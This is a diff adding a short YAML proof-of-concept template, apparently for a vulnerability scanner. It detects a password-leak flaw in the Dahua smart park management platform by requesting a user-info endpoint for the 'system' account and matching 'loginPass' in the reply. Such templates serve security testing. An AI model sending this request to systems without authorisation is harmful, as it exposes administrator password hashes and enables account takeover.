@@ -1,0 +1,11 @@
+name: poc-yaml-大华智慧园区综合管理平台-userleak
+description: >-
+  用户密码泄露采用MD5加密
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /admin/user_getUserInfoByUserName.action?userName=system
+    expression:
+      status: 200
+      body_all: ["loginPass"]
